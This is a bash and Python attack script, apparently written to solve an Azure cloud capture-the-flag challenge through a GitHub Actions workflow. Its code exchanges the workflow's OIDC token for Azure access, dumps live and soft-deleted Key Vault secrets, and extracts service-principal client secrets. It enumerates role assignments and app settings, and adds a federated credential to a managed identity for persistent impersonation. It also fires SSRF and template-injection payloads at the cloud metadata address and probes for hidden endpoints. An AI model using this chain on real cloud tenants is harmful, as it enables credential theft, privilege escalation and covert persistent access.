#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
KV_PROD="kv-tbl-prod-x3euoz"
KV_SEC="kv-tbl-sec-x3euoz"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

echo "=== VAULT TOKEN FOR CICD ==="
VAULT_TOK=$(az account get-access-token --resource https://vault.azure.net --query accessToken -o tsv 2>/dev/null)
echo "vault_tok_len=${#VAULT_TOK}"

echo "=== SOFT-DELETED SECRETS (KV prod) ==="
az keyvault secret list --vault-name $KV_PROD --include-deleted -o json 2>/dev/null | \
  python3 -c 'import sys,json; data=json.load(sys.stdin); [print(s.get("name",""),s.get("deletedDate",""),s.get("scheduledPurgeDate","")) for s in data]' 2>/dev/null || echo "list-deleted: failed"

echo "=== SOFT-DELETED SECRETS (KV sec) ==="
az keyvault secret list --vault-name $KV_SEC --include-deleted -o json 2>/dev/null | \
  python3 -c 'import sys,json; data=json.load(sys.stdin); [print(s.get("name",""),s.get("deletedDate",""),s.get("scheduledPurgeDate","")) for s in data]' 2>/dev/null || echo "list-deleted-sec: failed"

echo "=== GET SP CREDS ==="
for SP in reporting-service-principal reporting-viewer-principal; do
  RAW=$(az keyvault secret show --vault-name $KV_PROD --name $SP 2>/dev/null)
  CID=$(echo "$RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("appId",""))' 2>/dev/null)
  SEC=$(echo "$RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("clientSecret",""))' 2>/dev/null)
  export "CID_${SP//-/_}"="$CID"
  export "SEC_${SP//-/_}"="$SEC"
  echo "$SP: $CID"
done

export VAULT_TOK

python3 -I << 'PYEOF'
import os, json, urllib.request, urllib.parse, urllib.error, base64, re, hmac, hashlib, datetime

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE = "https://management.azure.com"
KV_PROD = "kv-tbl-prod-x3euoz"
KV_SEC = "kv-tbl-sec-x3euoz"
UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
UAMI_CID = "7a85156a-01c4-4e61-8472-40a92107159b"
REPORTING_RG = "rg-tbl-reporting-prod-eus"
PLATFORM_RG = "rg-tbl-platform-prod-sea"

def http(url, tok, method="GET", data=None, extra=None):
    h = {"Authorization": "Bearer " + tok}
    if extra: h.update(extra)
    if data:
        if isinstance(data, dict): data = json.dumps(data).encode(); h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=25)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:800]
    except Exception as e:
        return 0, str(e)[:200]

def sp_tok(cid, sec, scope):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({"client_id": cid, "client_secret": sec,
                "grant_type": "client_credentials", "scope": scope}).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token", "")
    except: return ""

VAULT_TOK = os.environ.get("VAULT_TOK", "")
RS_CID = os.environ.get("CID_reporting_service_principal", "")
RS_SEC = os.environ.get("SEC_reporting_service_principal", "")
RV_CID = os.environ.get("CID_reporting_viewer_principal", "")
RV_SEC = os.environ.get("SEC_reporting_viewer_principal", "")
output = []

# === 1. cicd-deployer vault token: soft-deleted secrets ===
print("\n=== 1. cicd-deployer vault token: soft-deleted ===")
print(f"vault_tok_len={len(VAULT_TOK)}")
if VAULT_TOK:
    s_del, b_del = http(f"https://{KV_PROD}.vault.azure.net/deletedsecrets?api-version=7.4", VAULT_TOK)
    print(f"KV prod deleted secrets: {s_del}: {b_del[:2000]}")
    output.append(f"KV_PROD_DELETED={s_del}:{b_del[:500]}")

    s_del2, b_del2 = http(f"https://{KV_SEC}.vault.azure.net/deletedsecrets?api-version=7.4", VAULT_TOK)
    print(f"KV sec deleted secrets: {s_del2}: {b_del2[:1000]}")
    output.append(f"KV_SEC_DELETED={s_del2}:{b_del2[:300]}")

    # cicd-deployer vault token: list KV prod secrets directly
    s_list, b_list = http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4", VAULT_TOK)
    print(f"KV prod vault list: {s_list}: {b_list[:2000]}")

    # Try to get insight/sync creds
    for name in ['reporting-insights-principal', 'tbl-reporting-insights', 'tbl-directory-sync',
                 'directory-sync-principal', 'insights-principal', 'platform-flag', 'flag', 'ctf']:
        s_s, b_s = http(f"https://{KV_PROD}.vault.azure.net/secrets/{name}?api-version=7.4", VAULT_TOK)
        if s_s == 200:
            print(f"FOUND {name}: {b_s[:500]}")
            output.append(f"SECRET_{name}={b_s}")

# === 2. reporting-service: all roles in reporting RG ===
print("\n=== 2. reporting-service: reporting RG roles ===")
RS_ARM = sp_tok(RS_CID, RS_SEC, "https://management.azure.com/.default")
RS_VAULT = sp_tok(RS_CID, RS_SEC, "https://vault.azure.net/.default")
print(f"RS ARM len={len(RS_ARM)} vault len={len(RS_VAULT)}")
if RS_ARM:
    s_rg, b_rg = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()", RS_ARM)
    print(f"Reporting RG ALL roles (atScope): {s_rg}")
    try:
        ras = json.loads(b_rg)
        for ra in ras.get("value", []):
            pid = ra["properties"]["principalId"]
            role = ra["properties"]["roleDefinitionId"].split("/")[-1]
            scope = ra["properties"]["scope"]
            ptype = ra["properties"].get("principalType", "")
            print(f"  pid={pid[:12]} role={role} scope_end={scope.split('/')[-1]} type={ptype}")
            output.append(f"REPORTING_RA={pid}::{role}::{scope}::{ptype}")
    except: print(b_rg[:2000])

    # Check UAMI role assignments specifically in reporting RG
    s_uami, b_uami = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{UAMI_OID}%27", RS_ARM)
    print(f"UAMI roles in reporting RG: {s_uami}: {b_uami[:1000]}")
    output.append(f"UAMI_REPORTING_ROLES={s_uami}:{b_uami[:300]}")

    # Full subscription-level query with RS ARM (Contributor on reporting RG)
    s_sub, b_sub = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{UAMI_OID}%27", RS_ARM)
    print(f"UAMI roles (sub-level, RS ARM): {s_sub}: {b_sub[:1000]}")
    output.append(f"UAMI_SUB_RS={s_sub}:{b_sub[:300]}")

    # reporting-service: list KV prod secrets (it has access policy)
    s_kv, b_kv = http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4", RS_VAULT)
    print(f"RS vault list KV prod: {s_kv}: {b_kv[:1000]}")

    # reporting-service: try KV SEC secrets (might have access policy)
    RS_VAULT_SEC = sp_tok(RS_CID, RS_SEC, "https://vault.azure.net/.default")
    s_sec, b_sec = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", RS_VAULT_SEC)
    print(f"RS vault list KV sec: {s_sec}: {b_sec[:500]}")
    output.append(f"RS_KVSEC={s_sec}:{b_sec[:300]}")

    # reporting-service: try deleted secrets on KV prod
    s_del3, b_del3 = http(f"https://{KV_PROD}.vault.azure.net/deletedsecrets?api-version=7.4", RS_VAULT)
    print(f"RS KV prod deleted: {s_del3}: {b_del3[:2000]}")
    output.append(f"RS_DELETED={s_del3}:{b_del3[:500]}")

    # reporting-service: list app settings for reporting
    s_as, b_as = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2022-03-01", RS_ARM, method="POST")
    print(f"Reporting app settings: {s_as}: {b_as[:2000]}")
    output.append(f"APPSETTINGS={s_as}:{b_as[:1000]}")

    # reporting-service: add federated credential to UAMI (to impersonate UAMI from GitHub)
    # This would let us authenticate as the UAMI identity
    import uuid
    fed_cred_name = f"ctf-probe-{str(uuid.uuid4())[:8]}"
    fed_cred_body = {
        "name": fed_cred_name,
        "issuer": "https://token.actions.githubusercontent.com",
        "subject": "repo:minhnq1618/tebamoto-platform:ref:refs/heads/solve-minhn",
        "audiences": ["api://AzureADTokenExchange"],
        "description": "CTF probe"
    }
    s_fc, b_fc = http(
        f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer/federatedIdentityCredentials/{fed_cred_name}?api-version=2023-01-31",
        RS_ARM, method="PUT", data=fed_cred_body
    )
    print(f"Add UAMI fed cred: {s_fc}: {b_fc[:500]}")
    output.append(f"UAMI_FED_CRED_ADD={s_fc}:{b_fc[:300]}")

# === 3. reporting-viewer: what can it actually do? ===
print("\n=== 3. reporting-viewer: enumerate access ===")
RV_ARM = sp_tok(RV_CID, RV_SEC, "https://management.azure.com/.default")
if RV_ARM:
    # List ALL resources it can see
    s_res, b_res = http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01", RV_ARM)
    print(f"RV resources (all): {s_res}: {b_res[:3000]}")
    output.append(f"RV_RESOURCES={s_res}:{b_res[:1000]}")

    # List ALL role assignments visible to it at sub level (with RV ARM)
    s_ra, b_ra = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{RV_CID}%27", RV_ARM)
    print(f"RV own roles (by appId): {s_ra}: {b_ra[:500]}")

    RV_OID = "eca94ded-76e6-4bb7-b435-40543a8c6b5f"
    s_ra2, b_ra2 = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{RV_OID}%27", RV_ARM)
    print(f"RV own roles (by OID): {s_ra2}: {b_ra2[:1000]}")
    output.append(f"RV_OWN_ROLES={s_ra2}:{b_ra2[:500]}")

    # Try reporting app settings with RV
    s_rva, b_rva = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2022-03-01", RV_ARM, method="POST")
    print(f"RV reporting app settings: {s_rva}: {b_rva[:1000]}")
    output.append(f"RV_APPSETTINGS={s_rva}:{b_rva[:500]}")

# === 4. KV prod: ARM list with includeSoftDeleted ===
print("\n=== 4. ARM soft-deleted secrets ===")
# Need cicd-deployer ARM token - use sync-service or reporting-service
SS_CID_ENV = os.environ.get("CID_reporting_service_principal", "")
SS_SEC_ENV = os.environ.get("SEC_reporting_service_principal", "")
if RS_ARM:
    # Check KV prod ARM secrets with includeSoftDeleted
    s_del4, b_del4 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/{KV_PROD}/secrets?api-version=2023-07-01&includeSoftDeleted=true", RS_ARM)
    print(f"KV prod secrets incl deleted (RS ARM): {s_del4}: {b_del4[:2000]}")
    output.append(f"KV_PROD_SOFT_DEL={s_del4}:{b_del4[:500]}")

# === 5. SSRF probe with correct template_id and additional data ===
print("\n=== 5. Storefront render probe ===")
STOREFRONT = "app-tbl-storefront-prod.azurewebsites.net"
FDID = "60407ff3-1c24-4875-9390-b6c9c13b0821"

for body in [
    {"template_id": "shipment-summary", "shipment_id": "{{7*7}}"},
    {"template_id": "shipment-summary", "data": {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}},
    {"template_id": "manifest", "data": {"report_url": "http://169.254.169.254/metadata/instance"}},
    {"template_id": "shipment-summary", "callback_url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
    {"template_id": "shipment-summary", "format": "pdf"},
]:
    payload = json.dumps(body).encode()
    req = urllib.request.Request(
        f"https://{STOREFRONT}/api/v1/reports/render",
        data=payload, method="POST",
        headers={"Content-Type": "application/json", "X-Azure-FDID": FDID}
    )
    try:
        r = urllib.request.urlopen(req, timeout=15)
        resp = r.read().decode(errors="replace")[:500]
        print(f"Body {str(body)[:60]}: 200: {resp}")
        if 'DF26' in resp or ('169.254' in str(body) and len(resp) > 100):
            output.append(f"SSRF_HIT={resp}")
    except urllib.error.HTTPError as e:
        resp = e.read().decode(errors="replace")[:200]
        print(f"Body {str(body)[:60]}: {e.code}: {resp}")
    except Exception as ex:
        print(f"Body {str(body)[:60]}: err: {str(ex)[:100]}")

# === 6. Check ALL storefront API endpoints ===
print("\n=== 6. Storefront API endpoints ===")
for path in ['/api/v1/', '/api/', '/api/v1/reports', '/api/v1/shipments', '/api/v1/config',
             '/api/v1/health', '/api/v1/debug', '/api/v1/admin', '/admin', '/debug',
             '/.env', '/api/v1/internal', '/internal']:
    req = urllib.request.Request(
        f"https://{STOREFRONT}{path}",
        method="GET",
        headers={"X-Azure-FDID": FDID}
    )
    try:
        r = urllib.request.urlopen(req, timeout=10)
        resp = r.read().decode(errors="replace")[:300]
        print(f"GET {path}: 200: {resp}")
        if 'DF26' in resp or 'flag' in resp.lower():
            output.append(f"FLAG_PATH={path}:{resp}")
    except urllib.error.HTTPError as e:
        resp = e.read().decode(errors="replace")[:100]
        print(f"GET {path}: {e.code}: {resp}")
    except Exception as ex:
        print(f"GET {path}: err: {str(ex)[:80]}")

print(f"\n=== OUTPUT ({len(output)} items) ===")
for o in output:
    print(o[:600])
PYEOF

echo "DONE"
